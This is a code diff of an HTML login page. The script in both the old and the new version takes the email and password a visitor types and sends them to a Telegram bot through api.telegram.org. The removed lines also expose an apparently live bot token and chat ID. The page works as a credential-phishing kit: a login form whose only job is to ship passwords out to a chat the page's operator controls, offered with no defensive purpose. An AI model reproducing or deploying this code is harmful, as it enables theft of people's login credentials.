@@ -12,46 +12,28 @@
   <form id="loginForm">
     <input id="email" type="email" placeholder="Email" required><br><br>
     <input id="password" type="password" placeholder="Password" required><br><br>
-    <button type="submit">Send to Telegram</button>
+    <button id="sendBtn">Send</button>
   </form>
+<script>
+ document.getElementById("sendBtn").addEventListener("click", function() {
+  var email = document.getElementById("email").value;
+  var password = document.getElementById("password").value;
 
-  <script>
-    document.getElementById("loginForm").addEventListener("submit", function(event) {
-      event.preventDefault();
+  var botToken = 'YOUR_BOT_TOKEN';
+  var chatId = 'YOUR_CHAT_ID';
+  var message = `Email: ${email}\nPassword: ${password}`;
+  var url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
-      var email = document.getElementById("email").value;
-      var password = document.getElementById("password").value;
-
-      // Token API từ BotFather và Chat ID
-      var botToken = '8110453433:AAG56s0dUVRc4uAWmlVm9_WQPv-DKkjO164';  // Thay bằng Bot Token của bạn
-      var chatId = '6022297636';  // Thay bằng Chat ID của bạn
-
-      // URL API của Telegram
-      var url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-
-      // Nội dung tin nhắn bạn muốn gửi
-      var message = `Email: ${email}\nPassword: ${password}`;
-
-      // Gửi yêu cầu đến Telegram API
-      fetch(url, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: message
-        })
-      })
-      .then(response => response.json())
-      .then(data => {
-        console.log('Message sent:', data);
-      })
-      .catch(error => {
-        console.error('Error:', error);
-      });
-    });
-  </script>
+  fetch(url, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ chat_id: chatId, text: message })
+  })
+  .then(response => response.json())
+  .then(data => console.log('Message sent:', data))
+  .catch(error => console.error('Error:', error));
+});
+</script>
 
 </body>
 </html>
